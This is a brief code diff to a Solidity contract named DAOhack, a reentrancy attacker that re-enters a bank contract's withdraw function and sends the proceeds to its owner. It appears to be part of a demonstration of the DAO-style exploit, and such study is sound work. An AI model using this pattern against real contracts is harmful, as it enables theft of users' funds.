@@ -32,14 +32,12 @@ contract DAOhack {
         if (!done) {
             done = true;
             bank.withdraw(bank.clients(this));
-            bank.ethBalance;
         }
     }
     
     function execute() payable {
-        uint balance = msg.value;
         bank.deposit.value(this.balance)();
-        bank.withdraw(balance);
+        bank.withdraw(msg.value);
         owner.transfer(this.balance);
     }
 }
